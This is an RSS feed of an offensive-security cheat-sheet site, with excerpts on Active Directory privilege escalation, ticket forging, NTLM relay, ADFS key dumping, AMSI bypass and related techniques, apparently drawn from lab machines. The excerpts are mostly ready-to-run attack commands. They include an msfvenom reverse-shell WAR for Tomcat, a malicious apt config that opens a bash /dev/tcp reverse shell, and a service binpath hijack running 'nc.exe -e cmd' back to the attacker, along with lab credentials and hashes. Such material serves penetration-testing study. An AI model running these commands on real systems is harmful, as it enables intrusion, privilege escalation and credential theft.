<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>TLDRBins</title>
    <link>https://tldrbins.github.io/</link>
    <description>Recent content on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Abuse Parent Child Domain Trusts</title>
      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * PS C:\Windows\system32&amp;gt; Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=example.com,CN=System,DC=corp,DC=example,DC=com ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : example.com ObjectClass : trustedDomain ObjectGUID : b0c64079-6f51-4516-9a62-90f94666bfc1 SelectiveAuthentication : False SIDFilteringForestAware : False SIDFilteringQuarantined : False Source : DC=corp,DC=example,DC=com Target : example.</description>
    </item>
    <item>
      <title>Account Operators</title>
      <link>https://tldrbins.github.io/account_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/account_operators/</guid>
      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 *Evil-WinRM* PS C:\programdata&amp;gt; . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force *Evil-WinRM* PS C:\programdata&amp;gt; $new_user_password = ConvertTo-SecureString &amp;#39;Test1234&amp;#39; -AsPlainText -Force 4.</description>
    </item>
    <item>
      <title>AD Recycle Bin</title>
      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
      <description>Privesc #1: Restore deleted AD account Windows 1. Import AD module import-module activedirectory *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects Deleted : True DistinguishedName : CN=Another User\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=example,DC=com Name : Another User DEL:ebe15df5-e265-45ec-b7fc-359877217138 ObjectClass : user ObjectGUID : ebe15df5-e265-45ec-b7fc-359877217138 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq &amp;#39;&amp;lt;DELETED_USER&amp;gt;&amp;#39; } -includeDeletedObjects -property * *Evil-WinRM* PS C:\Users\test.</description>
    </item>
    <item>
      <title>ADCS</title>
      <link>https://tldrbins.github.io/adcs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adcs/</guid>
      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
    </item>
    <item>
      <title>AddKeyCredentialLink</title>
      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
      <description>Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py -t &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;lt;DC_IP&amp;gt; --use-ldaps $ python3 pywhisker.py --action list -d outdated.htb -u &amp;#39;btables&amp;#39; -p &amp;#39;5myBPLPDKT3Bfq&amp;#39; --dc-ip 10.10.11.175 -t &amp;#39;sflowers&amp;#39; --use-ldaps [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute 1. Add shadow credentials python3 pywhisker.</description>
    </item>
    <item>
      <title>AddMember</title>
      <link>https://tldrbins.github.io/addmember/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addmember/</guid>
      <description>Privesc #1: Add User to Group (From Linux) bloodyAD powerview.py 1. Add User to Group # With password bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; --dc-ip &amp;lt;DC_IP&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; # With Kerberos bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; --dc-ip &amp;lt;DC_IP&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; Ref: bloodyAD&#xA;1. Connect # With password sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; $ sudo ntpdate -s dc01.rebound.htb &amp;amp;&amp;amp; powerview &amp;#39;rebound.</description>
    </item>
    <item>
      <title>AddSelf</title>
      <link>https://tldrbins.github.io/addself/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addself/</guid>
      <description>Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; $ python3 bloodyAD.py -d rebound.htb -u &amp;#39;oorend&amp;#39; -p &amp;#39;1GR8t@$$4u&amp;#39; --host 10.10.11.231 add groupMember SERVICEMGMT &amp;#39;oorend&amp;#39; [+] oorend added to SERVICEMGMT # With Kerberos python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; $ python3 bloodyAD.</description>
    </item>
    <item>
      <title>ADFS</title>
      <link>https://tldrbins.github.io/adfs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adfs/</guid>
      <description>Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe *Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&amp;gt; .\ADFSDump.exe ___ ____ ___________ ____ / | / __ \/ ____/ ___// __ \__ ______ ___ ____ / /| | / / / / /_ \__ \/ / / / / / / __ `__ \/ __ \ / ___ |/ /_/ / __/ ___/ / /_/ / /_/ / / / / / / /_/ / /_/ |_/_____/_/ /____/_____/\__,_/_/ /_/ /_/ .</description>
    </item>
    <item>
      <title>Advance curl</title>
      <link>https://tldrbins.github.io/advance_curl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/advance_curl/</guid>
      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # PUT a file curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # PUT a file (with creds) curl -X PUT -u &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; --data-binary @&amp;lt;FILE&amp;gt; # POST a file with form param &amp;#39;file&amp;#39; curl -X POST -F &amp;#39;file=@&amp;lt;FILE&amp;gt;;type=&amp;lt;APPLICATION_TYPE&amp;gt;;filename=&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # POST a file in raw-text format (not as attachment) with form param &amp;#39;file&amp;#39; curl -X POST -F &amp;#39;file=&amp;lt;&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Not to handle sequences of &amp;#39;/.</description>
    </item>
    <item>
      <title>Advance wget</title>
      <link>https://tldrbins.github.io/advance_wget/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/advance_wget/</guid>
      <description>Advance wget # Provide a file with urls wget --input-file &amp;lt;FILE_PATH&amp;gt; # POST a file wget --post-file &amp;lt;FILE_PATH&amp;gt; &amp;lt;TARGET&amp;gt; # Overwrite a file wget &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -O &amp;lt;FILE_PATH&amp;gt; </description>
    </item>
    <item>
      <title>AllowedToDelegate</title>
      <link>https://tldrbins.github.io/allowedtodelegate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
      <description>Privesc #1: Forge a Ticket Linux Windows 1. Pre-Check # With password impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; # With hash impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -no-pass 2. Get a Service Ticket sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -impersonate &amp;#39;&amp;lt;IMPERSONATE_USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ sudo ntpdate -s dc.intelligence.htb &amp;amp;&amp;amp; impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator &amp;#39;intelligence.htb/svc_int&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [-] CCache file is not found.</description>
    </item>
    <item>
      <title>Alternate Data Stream</title>
      <link>https://tldrbins.github.io/alternate_data_stream/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/alternate_data_stream/</guid>
      <description>Show ADS cmd powershell # cmd cmd /C dir /R &amp;lt;PATH&amp;gt; C:\Users\Administrator\Desktop&amp;gt; cmd /C dir /R C:\users\administrator\desktop Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\users\administrator\desktop 11/08/2017 10:05 AM &amp;lt;DIR&amp;gt; . 11/08/2017 10:05 AM &amp;lt;DIR&amp;gt; .. 12/24/2017 03:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,652,184,576 bytes free # Read more &amp;lt; &amp;lt;FILE&amp;gt;:&amp;lt;STREAM&amp;gt; C:\Users\Administrator\Desktop&amp;gt; more &amp;lt; hm.</description>
    </item>
    <item>
      <title>Android</title>
      <link>https://tldrbins.github.io/android/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/android/</guid>
      <description>Unpack .apk file # Get .smali files java -jar apktool_2.9.3.jar d &amp;lt;FILE&amp;gt; # Get .java files jadx &amp;lt;FILE&amp;gt; Ref: apktool Ref: jadx&#xA;Re-pack .apk file 1. Initial pack java -jar apktool_2.9.3.jar b --use-aapt2 &amp;lt;APP&amp;gt; -o &amp;lt;APP&amp;gt;_repacked.apk 2. zip align zipalign&#xA;3. Sign the apk keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks --ks-pass pass:&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --out &amp;lt;APP&amp;gt;_final.apk &amp;lt;APP&amp;gt;_repacked.apk Dynamic Debugging 1. Set up +--------------------------------------------------------------------+ | 1.</description>
    </item>
    <item>
      <title>Apache</title>
      <link>https://tldrbins.github.io/apache/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/apache/</guid>
      <description>Check Apache version apache&#xA;Config location /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/default-ssl.conf </description>
    </item>
    <item>
      <title>Apache Tomcat</title>
      <link>https://tldrbins.github.io/apache_tomcat/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/apache_tomcat/</guid>
      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; -f war -o revshell.war $ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f war -o revshell.war Payload size: 13029 bytes Final size of war file: 13029 bytes Saved as: revshell.war 2. Start a listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 1337 listening on [any] 1337 .. 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1.</description>
    </item>
    <item>
      <title>Apt</title>
      <link>https://tldrbins.github.io/apt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/apt/</guid>
      <description>MITM (Man-in-the-Middle) 1. Add proxy path in target machine export http_proxy=http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PROXY_PORT&amp;gt; 2. Start proxy in local machine # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port &amp;lt;LOCAL_PROXY_PORT&amp;gt; 3. Redirect traffic to our server # Edit /etc/hosts in target machine &amp;lt;LOCAL_IP&amp;gt; apt.update.example.com SUDO 1. Create a malicious config echo &amp;#39;APT::Update::Pre-Invoke {&amp;#34;bash -c &amp;#39;\&amp;#39;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/&amp;lt;LOCAL_PORT&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#39;&amp;#39;&amp;#34;}&amp;#39; &amp;gt; /etc/apt/apt.conf.d/evil 2. Exploit sudo apt update -y </description>
    </item>
    <item>
      <title>AWS</title>
      <link>https://tldrbins.github.io/aws/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/aws/</guid>
      <description>Setup # Install awscli sudo apt install awscli # Set config aws configure AWS Access Key ID [None]: test AWS Secret Access Key [None]: test Default region name [None]: test Default output format [None]: Default AWS Credential Location ~/.aws/credentials AWS Services S3 dynamodb lambda # List buckets aws s3 --endpoint-url &amp;lt;TARGET&amp;gt; ls # List bucket aws s3 --endpoint-url &amp;lt;TARGET&amp;gt; ls s3://&amp;lt;BUCKET_NAME&amp;gt; # Upload to bucket aws s3 --endpoint-url &amp;lt;TARGET&amp;gt; cp &amp;lt;FILE&amp;gt; s3://&amp;lt;BUCKET_NAME&amp;gt;/&amp;lt;FILE&amp;gt; # List tables aws --endpoint-url &amp;lt;TARGET&amp;gt; dynamodb list-tables # Dump table aws --endpoint-url &amp;lt;TARGET&amp;gt; dynamodb scan --table-name &amp;lt;TABLE_NAME&amp;gt; # Create table (e.</description>
    </item>
    <item>
      <title>Bloodhound</title>
      <link>https://tldrbins.github.io/bloodhound/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/bloodhound/</guid>
      <description>Info Collection (From Linux) bloodhound-python nxc certipy-ad # With password bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip $ python3 bloodhound.py -d rebound.htb -u oorend -p &amp;#39;1GR8t@$$4u&amp;#39; -dc dc01.rebound.htb -ns 10.10.11.231 -c all --zip INFO: Found AD domain: rebound.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.rebound.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead.</description>
    </item>
    <item>
      <title>Built-in Group</title>
      <link>https://tldrbins.github.io/built-in_group/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/built-in_group/</guid>
      <description>Abuse #1. Modify service path # Start a nc listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 443 listening on [any] 443 ... Windows 1. Change service path # Assumed nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; *Evil-WinRM* PS C:\ProgramData&amp;gt; sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd 10.10.14.44 443&amp;#34; [SC] ChangeServiceConfig SUCCESS 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe stop VSS [SC] ControlService FAILED 1062: The service has not been started.</description>
    </item>
    <item>
      <title>Bypass ASMI</title>
      <link>https://tldrbins.github.io/bypass_asmi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/bypass_asmi/</guid>
      <description>evil-winrm payloads menu Bypass-4MSI Note: have to run menu first&#xA;Amsi-Bypass-Payloads</description>
    </item>
    <item>
      <title>Compressed Files</title>
      <link>https://tldrbins.github.io/compressed_files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/compressed_files/</guid>
      <description>Hint: Always put the zip file inside a new folder before unzip&#xA;zip tar.gz tar gz rar 7z bz # zip a file zip &amp;lt;FILE&amp;gt;.zip &amp;lt;FILE&amp;gt; # zip a folder zip -r &amp;lt;FOLDER&amp;gt;.zip &amp;lt;FOLDER&amp;gt;/ # zip a symlink (not the destination file) zip --symlinks file.zip &amp;lt;SYMLINK&amp;gt; # List files without unzip unzip -l &amp;lt;FILE&amp;gt; # unzip unzip &amp;lt;FILE&amp;gt; # zip (Windows) Compress-Archive -Path &amp;#34;&amp;lt;FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; # zip a folder (Windows) Add-Type -Assembly System.</description>
    </item>
    <item>
      <title>Connection from Public Internet</title>
      <link>https://tldrbins.github.io/connection_from_public_internet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net ngrok # Start a local HTTP server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 3000 Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ... # Redirect http request to localhost:&amp;lt;LOCAL_PORT&amp;gt; ssh -R 80:localhost:&amp;lt;LOCAL_PORT&amp;gt; serveo.net $ ssh -R 80:localhost:3000 serveo.net Forwarding HTTP traffic from https://7ddf32e17a6ac5ce04a8ecbf782ca509.serveo.net ngrok http 80 Ref: ngrok Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
    </item>
    <item>
      <title>Constrained Delegation</title>
      <link>https://tldrbins.github.io/constrained_delegation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
      <description>Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k -no-pass $ sudo ntpdate -s dc01.rebound.htb &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;rebound.htb/delegator$&amp;#39; -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [*] Getting machine hostname [-] CCache file is not found. Skipping... [-] CCache file is not found. Skipping... [*] Getting machine hostname AccountName AccountType DelegationType DelegationRightsTo SPN Exists ----------- ----------------------------------- -------------- --------------------- ---------- delegator$ ms-DS-Group-Managed-Service-Account Constrained http/dc01.</description>
    </item>
    <item>
      <title>CouchDB</title>
      <link>https://tldrbins.github.io/couchdb/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/couchdb/</guid>
      <description>Basic # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/&amp;lt;DB_NAME&amp;gt;/_all_docs # Show a entry curl http://localhost:5984/&amp;lt;DB_NAME&amp;gt;/&amp;lt;ID_HASH&amp;gt; </description>
    </item>
    <item>
      <title>Create custom dll</title>
      <link>https://tldrbins.github.io/create_custom_dll/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/create_custom_dll/</guid>
      <description>Create Custom Dll +---------------------------------------------------------+ | 1. Open Visual Studio | | 2. Create New Project -&amp;gt; C++ Dynamic-Link Library (DLL) | +---------------------------------------------------------+ #include &amp;#34;pch.h&amp;#34; #include &amp;lt;stdlib.h&amp;gt; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: system(&amp;#34;cmd.exe /c ping &amp;lt;LOCAL_IP&amp;gt;&amp;#34;); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } +----------------------------+ | 3. Replace the code | | 4. Dropdown release -&amp;gt; x64 | | 5.</description>
    </item>
    <item>
      <title>Cron Jobs</title>
      <link>https://tldrbins.github.io/cron/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/cron/</guid>
      <description>Linux Check Cron Jobs ls -la /etc/cron.d/ cat /etc/crontab crontab -l Check background processes ./pspy Ref: pspy</description>
    </item>
    <item>
      <title>Cross Session Relay</title>
      <link>https://tldrbins.github.io/cross_session_relay/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 *Evil-WinRM* PS C:\Users\winrm_svc\Documents&amp;gt; .\RunasCs.exe x x qwinsta -l 9 SESSIONNAME USERNAME ID STATE TYPE DEVICE &amp;gt;services 0 Disc console tbrady 1 Active Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt; $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 2. Trigger auth request .</description>
    </item>
    <item>
      <title>Custom Word List Generator</title>
      <link>https://tldrbins.github.io/custom_wordlist_generator/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/custom_wordlist_generator/</guid>
      <description>CeWL # Creating custom wordlist by spidering target website cewl &amp;lt;TARGET&amp;gt; -w wordlist.txt --with-numbers Ref: CeWL</description>
    </item>
    <item>
      <title>disk group</title>
      <link>https://tldrbins.github.io/disk/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/disk/</guid>
      <description>Basic # Show devices lsblk $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 12G 0 disk ├─sda1 8:1 0 120M 0 part /boot ├─sda2 8:2 0 1K 0 part └─sda5 8:5 0 11.9G 0 part ├─Kotarak--vg-root 252:0 0 7G 0 lvm / └─Kotarak--vg-swap_1 252:1 0 1G 0 lvm [SWAP] sr0 11:0 1 1024M 0 rom # Device attributes blkid $ blkid /dev/sda1: UUID=&amp;#34;67e178a9-1b2a-407e-8d3f-7b1772bab2be&amp;#34; TYPE=&amp;#34;ext2&amp;#34; PARTUUID=&amp;#34;1b9f3540-01&amp;#34; /dev/sda5: UUID=&amp;#34;LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD&amp;#34; TYPE=&amp;#34;LVM2_member&amp;#34; PARTUUID=&amp;#34;1b9f3540-05&amp;#34; /dev/mapper/Kotarak--vg-root: UUID=&amp;#34;efb44a28-8edc-4d40-aca3-81e57d58d759&amp;#34; TYPE=&amp;#34;ext4&amp;#34; /dev/mapper/Kotarak--vg-swap_1: UUID=&amp;#34;162b2913-7dcf-4ba7-bddc-238a22f16e52&amp;#34; TYPE=&amp;#34;swap&amp;#34; # Show device mapping ls -l /dev/mapper/ $ ls -l /dev/mapper/ total 0 crw------- 1 root root 10, 236 Sep 22 23:22 control lrwxrwxrwx 1 root root 7 Sep 22 23:22 Kotarak--vg-root -&amp;gt; .</description>
    </item>
    <item>
      <title>DNS Enum</title>
      <link>https://tldrbins.github.io/dns_enum/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dns_enum/</guid>
